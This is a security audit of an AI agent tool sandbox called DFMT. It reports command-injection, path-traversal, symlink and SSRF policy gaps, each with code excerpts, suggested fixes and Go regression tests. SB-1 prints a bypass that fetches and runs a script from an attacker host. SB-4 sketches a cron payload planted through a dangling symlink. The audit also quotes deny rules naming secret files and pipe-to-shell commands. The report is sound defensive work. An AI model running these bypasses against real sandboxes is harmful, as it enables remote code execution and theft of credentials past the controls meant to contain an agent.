# sc-sandbox: Sandbox Surface Security Audit

Scope: HUNT phase scan of DFMT's sandboxed exec/read/fetch/glob/grep/edit/write tools.
Files audited:
- `internal/sandbox/sandbox.go`
- `internal/sandbox/permissions.go`
- `internal/sandbox/intent.go`
- `internal/sandbox/runtime.go`
- `internal/sandbox/sandbox_test.go`
- `internal/sandbox/permissions_test.go`
- `internal/sandbox/intent_policy_test.go`
- `internal/transport/handlers.go`
- `internal/transport/handlers_sandbox_test.go`
- `internal/transport/handlers_test.go`
- `internal/transport/jsonrpc.go`
- `internal/transport/http.go`
- `internal/transport/mcp.go`
- `internal/core/index_persist.go`
- `internal/core/journal.go`

Recent commits (`R15-1..R15-4`, TCP-auth-disable) verified to be in place.

---

## Findings summary

| ID | Severity | Class | Title |
|----|----------|-------|-------|
| SB-1 | Critical | CWE-78 / CWE-94 | Command substitution inside double quotes bypasses chain detection (RCE) |
| SB-2 | High | CWE-22 | Glob/Grep read file content without per-file deny-rule enforcement |
| SB-3 | High | CWE-22 / CWE-434 | Windows: write/edit deny rules silently fail because path separators are not normalized |
| SB-4 | Medium | CWE-59 / CWE-434 | Write/Edit symlink containment check skipped when EvalSymlinks errors (dangling symlink TOCTOU) |
| SB-5 | Medium | CWE-78 | Allow-rule glob casing on fetch URLs is case-sensitive |
| SB-6 | Low | Hardening | Edit calls `PolicyCheck("write", …)` — explicit `Op: "edit"` deny rules in DefaultPolicy are dead |
| SB-7 | Info | Hardening | `globMatch` for `read` strips Windows backslashes, but `fetch` allow patterns share the path-glob engine |

Verdict counts:
- Critical: 1
- High: 2
- Medium: 2
- Low: 1
- Info: 1

---

## Command Injection (CWE-78) / RCE (CWE-94)

### SB-1 (Critical) — Command substitution inside double quotes is opaque to the policy

`internal/sandbox/permissions.go:613-722` (`splitByShellOperators`).

The recent R15-1 fix added recursive splitting of `$(...)` and backtick substitutions so an inner command like `curl evil | sh` is policy-checked as a chain. **However the recursion only fires in the `!inQuote` branch.** Inside double quotes the loop falls through to `current.WriteByte(c)` for every byte:

```go
} else if !inQuote {
    if c == '$' && i+1 < len(cmd) && cmd[i+1] == '(' { ... recursion ... }
    if c == '`' { ... recursion ... }
    ...
} else {
    current.WriteByte(c)   // inside quotes — substitution markers preserved verbatim
}
```

Bash still expands `$(...)` and backticks inside double quotes. Concrete bypass:

```
Code: git "$(curl http://attacker/x.sh | sh)"
Lang: bash
```

Walk-through:
1. `hasShellChainOperators` returns true (sees `$(`).
2. `extractBaseCommand` returns `git` (quote-aware, stops at first unquoted space).
3. `policy.Evaluate("exec", "git")` matches the default `git` allow rule.
4. Full-command deny check (`curl * | sh`) anchors with `^...$`; the actual string starts with `git` so it never matches.
5. `splitByShellOperators` returns a single part — the entire `git "..."` string — because the `$(...)` is inside `"..."`. Per-part check passes (base = `git`).
6. `bash -c 'git "$(curl ... | sh)"'` runs the substitution → arbitrary remote code execution.

The same pattern applies to backticks: `git "\`curl evil | sh\`"`.

**Suggested fix.** Make the parser quote-aware about substitution: even inside double quotes, scan for `$(...)` and `` `...` `` and recurse. (Single-quote contents stay opaque — bash does not expand there.)

The existing `TestBackgroundOperatorQuotedAmpersandIgnored` test bakes in the wrong invariant for `&` (correct) but does not cover `$(...)` inside quotes.

---

## Path Traversal (CWE-22, CWE-59) / Write (CWE-434)

### SB-2 (High) — Glob/Grep ignore the read deny rules

`internal/sandbox/permissions.go:1058-1155` (Glob), `1157-1278` (Grep).

Both helpers do `s.PolicyCheck("read", absWd)` once against the working-directory path, then read every matched file with `os.ReadFile(fullPath)`. The deny rules

```go
{Op: "read", Text: ".env*"},
{Op: "read", Text: "**/.env*"},
{Op: "read", Text: "**/secrets/**"},
{Op: "read", Text: "**/id_rsa"},
{Op: "read", Text: "**/id_*"},
```

are evaluated against the wd path (e.g. `D:\proj\foo`), which never matches `.env*`. The per-file paths are never policy-checked.

Concrete bypass:
- `dfmt_glob` with `pattern: "**/.env*"` and `intent: "AWS_KEY|TOKEN"` returns matched lines from `.env`, `.env.local`, etc. as `Matches[].Text` (line 1117 → `os.ReadFile`).
- `dfmt_grep` with `pattern: "AWS_SECRET"` reads every file under wd, including `**/.env*`, `**/secrets/**`, `**/id_rsa`, returning the matched line via `GrepMatch.Content`.

The Read deny rules — the project's primary defense for not leaking secrets — are silently bypassed.

**Suggested fix.** In Glob's per-file loop and Grep's per-file scan, run `s.PolicyCheck("read", fullPath)` before opening the file. Skip files that fail the check (silently or as a flagged "denied" entry).

### SB-3 (High) — Windows: write/edit deny rules don't normalize backslash paths

`internal/sandbox/permissions.go:224-240` (`globMatch`).

```go
func globMatch(pattern, text string, op string) bool {
    if op == "read" {
        text = filepath.ToSlash(text)
        pattern = filepath.ToSlash(pattern)
    }
    ...
}
```

Only `op == "read"` calls `filepath.ToSlash`. `write`, `edit`, and `fetch` keep the platform path separator. On Windows, `Sandbox.Write()` calls `filepath.Clean(absPath)` which produces `C:\proj\.env`. The deny rule `**/.env*` is compiled with literal `/` separators; the regex `^.*/\.env[^/]*$` does not match `C:\proj\.env`.

Concrete bypass on Windows:
```
dfmt_write path=".env"           content="AWS_KEY=stolen"          → succeeds
dfmt_write path=".git/config"    content="..."                     → succeeds
dfmt_write path=".dfmt/journal.jsonl" content="..."                → succeeds
dfmt_edit  path=".env"  old_string="real"  new_string="planted"     → succeeds (after creating)
```

The R15-3 commit fixed the symlink follow gap but did not address the separator gap.

**Suggested fix.** Apply `filepath.ToSlash` for all path-based ops (`read`, `write`, `edit`), not just `read`. The existing comment at line 225 even says "for path-based ops"; the implementation just forgot the others.

### SB-4 (Medium) — Write/Edit symlink check skipped when target is missing

`internal/sandbox/permissions.go:1430-1442` (Write), `1351-1361` (Edit).

```go
if resolved, rerr := filepath.EvalSymlinks(cleanPath); rerr == nil {
    ... containment check ...
}
```

`filepath.EvalSymlinks` fails when the path or any component (including the symlink target) does not exist. If a symlink inside the wd points to a non-existent target outside wd, `EvalSymlinks` returns an error and the containment check is skipped. `os.WriteFile` then follows the symlink and creates the target.

Exploit shape:
1. The wd contains (or an earlier `dfmt_exec`-allowed command — e.g. `git checkout`, `npm install`, custom hooks — places) a dangling symlink: `wd/leak.txt` → `/etc/cron.d/dfmt-payload` (target does not exist yet).
2. Agent calls `dfmt_write path="leak.txt" content="* * * * * root sh -c '...'"`.
3. EvalSymlinks fails → check skipped → `os.WriteFile` creates `/etc/cron.d/dfmt-payload` outside the wd.

For Edit the file must already exist for the old-string match, so the symlink target must resolve — making Edit less exploitable but still dependent on the same gap.

**Suggested fix.** When `EvalSymlinks` errors with anything other than ENOENT on a non-symlink leaf, refuse the write. A robust approach: `EvalSymlinks(filepath.Dir(cleanPath))` and re-check containment of the resolved parent + the leaf. Or open with `O_NOFOLLOW` (Unix; Windows requires equivalent flags) so a symlink leaf is rejected at write time.

---

## Server-Side Request Forgery (CWE-918) / Open Redirect (CWE-601)

### SB-5 (Medium) — Allow-rule URL match is case-sensitive but `assertFetchURLAllowed` lowercases

`internal/sandbox/permissions.go:847-893` (`assertFetchURLAllowed`), `224-240` (`globMatch`).

`PolicyCheck("fetch", req.URL)` runs first, with the raw URL. The default deny rules (`http://169.254.169.254/*`, `file://*`, etc.) compile to regexes that are case-sensitive. URLs with mixed-case schemes (`HTTP://169.254.169.254/`, `FILE:///etc/passwd`) bypass the deny rules.

Defense in depth (`assertFetchURLAllowed` does `strings.ToLower(u.Scheme)`) catches `FILE:` because only `http`/`https` schemes are accepted. So the practical impact today is: the deny rules silently no-op for mixed-case schemes/hosts, and a future change that loosens scheme handling would re-expose the issue. Net: not directly exploitable, but the layered defense is weaker than it appears.

The same case sensitivity issue affects deny rules like `http://169.254.169.254/*` vs. `HTTP://...`; the IP literal is also lowercased only in `assertFetchURLAllowed`, so the deny rule depends on `assertFetchURLAllowed` to catch this case.

**Suggested fix.** Lowercase the scheme + host portion of the URL before policy evaluation. Either:
- normalize at the call site: `s.PolicyCheck("fetch", normalizeFetchURL(req.URL))`, or
- in `globMatch` for `op == "fetch"`, lowercase both pattern and text.

Otherwise document this as load-bearing on `assertFetchURLAllowed` and add a regression test for `Fetch(URL: "HTTP://169.254.169.254/")`.

Other SSRF guards verified working:
- DNS-rebinding-safe `DialContext` (line 967-1002) parses → resolves → re-validates → dials by IP literal. Good.
- Redirect re-check via `CheckRedirect` runs `assertFetchURLAllowed` again. Good.
- DNS-failure-is-block policy (line 880-883). Good.
- Cloud metadata host blocking before DNS (line 864-867). Good.
- `MaxFetchBodyBytes = 8 MiB` cap on response body (line 842, 1022). Good.
- `Timeout <= 0 → 30s` floor (line 958-961). Good.

---

## Insecure Deserialization (CWE-502)

No issues found by sc-sandbox.

- `internal/core/index_persist.go` uses `encoding/json` for the index and cursor; no `encoding/gob` is in the production tree (`grep encoding/gob` only hits docs and one test). Despite ARCHITECTURE.md mentioning "index.gob", the actual implementation is JSON, atomic-rename-with-fsync, mode 0600.
- `internal/core/journal.go` uses JSONL with a 1 MiB per-line cap (`maxEventBytes`, `scannerBufferMax`). `bufio.Scanner.Buffer` is bounded; oversized lines are refused at write and skipped with a warning at read. JSON decoding into the typed `Event` struct rejects unknown shapes safely.
- `internal/transport/jsonrpc.go` caps a single line at 1 MiB (`MaxJSONRPCLineBytes`), uses `json.Unmarshal` into typed structs, and HTTP wraps the body with `http.MaxBytesReader(w, r.Body, 1<<20)`.

---

## Open Redirect (CWE-601)

No issues found by sc-sandbox beyond SB-5 (which is on the inbound URL evaluation, not redirect handling). Redirects re-validate via `CheckRedirect` and refuse blocked targets, including mid-redirect link-local / metadata IPs. Cap at 10 redirects.

---

## Command Injection / RCE — secondary findings

Verified working:
- Bare `&` chain detection (`hasShellChainOperators` line 462) — fixed under V-1.
- Quote-aware base command extraction (`extractBaseCommand` line 435).
- Recursive substitution split for unquoted `$(...)` and backticks — R15-1.
- `dfmt`-recursion deny rules.
- Env var sandbox blocklist (`isSandboxEnvBlocked` line 1673) covers `LD_*`, `DYLD_*`, `GIT_*`, `NODE_*`, `PYTHON*`, `RUBY*`, `PERL5*`, `PATH`, `IFS`, `BASH_ENV`, `ENV`, `PS4`, `PROMPT_COMMAND`, `HOME`, `USER`, etc.
- Exec timeout cap at `MaxExecTimeout = 300s` (line 1482-1484).
- Output cap at `MaxRawBytes = 256 KiB` with rune-boundary trim (line 1518-1524).
- Grep regex complexity bound (`validateGrepPattern` line 1280-1298) caps pattern bytes, AST nodes, and repeat nesting.

---

## Hardening notes

### SB-6 (Low) — `Op: "edit"` deny rules are dead code

`internal/sandbox/permissions.go:150-167` declares deny rules for `Op: "edit"`, but `Sandbox.Edit()` calls `s.PolicyCheck("write", cleanPath)` (line 1364). The `Op: "edit"` entries never fire. The protection is preserved only because every `edit` rule is duplicated as a `write` rule.

**Suggested fix.** Either delete the `Op: "edit"` rules (they are dead) or change `Edit()` to call both `PolicyCheck("write", ...)` and `PolicyCheck("edit", ...)`. Removing them is cleaner because the duplication invites drift.

### SB-7 (Info) — Glob result truncation cap is good, but no per-file size cap

Glob caps inline files at 500 (line 1137-1141). `MaxSandboxReadBytes = 4 MiB` limits Read but Glob's intent-match loop reads each candidate via `os.ReadFile(fullPath)` with no size cap (line 1117). A pathological 1 GiB file inside the wd will be slurped into memory.

**Suggested fix.** Wrap the per-file read in `io.ReadAll(io.LimitReader(f, MaxSandboxReadBytes))` like `Read` does, or skip files larger than some threshold. Same observation for Grep at line 1225.

---

## Notes verified clean

- TCP loopback auth disable (`authToken` always empty + same-origin gate + 0600 port file) — see `internal/transport/http.go:84-94, 207-241, 466-507`. Non-loopback binds would need re-enabling auth, but the design is consistent with the comment.
- Dashboard CSP (`script-src 'self'`, no inline) and X-Frame-Options DENY.
- JSON-RPC parse-error response uses `ID: nil` per spec.
- `decodeRPCParams` (line 383-395) properly returns `-32602` on malformed params instead of zero-valuing.
- Exec/Fetch/etc. acquire bounded semaphores (`execSem` 4, `fetchSem` 8) so runaway agent loops can't spawn unbounded subprocesses.
- Redaction is wired before journal writes for tool.exec/read/fetch (`logEvent` → `redactData`).
- Null-byte rejection on Read/Write/Edit paths (line 735, 1341, 1420).
- `os.WriteFile` preserves existing file mode rather than widening to 0o600 (line 1456-1462).

---

## Reproduction notes

For SB-1 (critical RCE), a unit test demonstrating the gap would look like:

```go
func TestSandbox_QuotedSubstitutionBypass(t *testing.T) {
    sb := NewSandbox(t.TempDir())
    _, err := sb.Exec(context.Background(), ExecReq{
        Code: `git "$(echo SUDO_BYPASS)"`, // surrogate for `curl evil | sh`
        Lang: "bash",
    })
    if err == nil {
        t.Fatal("expected policy denial; substitution inside double quotes must be checked")
    }
}
```

For SB-3 (Windows write deny gap):

```go
// On windows GOOS only.
func TestSandbox_WindowsWriteEnvDeny(t *testing.T) {
    if runtime.GOOS != "windows" { t.Skip() }
    sb := NewSandbox(t.TempDir())
    _, err := sb.Write(context.Background(), WriteReq{
        Path:    ".env",
        Content: "AWS_KEY=x",
    })
    if err == nil {
        t.Fatal("expected .env write to be denied by policy on Windows")
    }
}
```

For SB-2 (Glob read-deny bypass):

```go
func TestSandbox_GlobLeaksDotEnv(t *testing.T) {
    wd := t.TempDir()
    _ = os.WriteFile(filepath.Join(wd, ".env"), []byte("AWS_KEY=hunter2"), 0o600)
    sb := NewSandbox(wd)
    resp, err := sb.Glob(context.Background(), GlobReq{
        Pattern: "*",
        Intent:  "AWS_KEY",
    })
    if err != nil { t.Fatal(err) }
    for _, m := range resp.Matches {
        if strings.Contains(m.Text, "hunter2") {
            t.Fatalf("Glob leaked .env contents: %q", m.Text)
        }
    }
}
```
